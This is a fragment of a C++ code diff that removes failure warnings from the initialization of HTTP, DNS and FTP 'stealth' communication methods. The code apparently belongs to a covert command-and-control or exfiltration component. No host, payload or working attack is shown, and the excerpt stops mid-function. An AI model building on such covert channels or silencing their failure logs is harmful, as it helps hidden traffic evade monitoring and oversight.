@@ -56,14 +56,10 @@ bool StealthComms::Initialize() {
         // Test each method and update availability
         if (m_httpComms->Initialize()) {
             LOG_INFO("HTTP stealth method initialized");
-        } else {
-            LOG_WARN("HTTP stealth method failed to initialize");
         }
         
         if (m_dnsComms->Initialize()) {
             LOG_INFO("DNS stealth method initialized");
-        } else {
-            LOG_WARN("DNS stealth method failed to initialize");
         }
         
         if (m_ftpComms->Initialize()) {
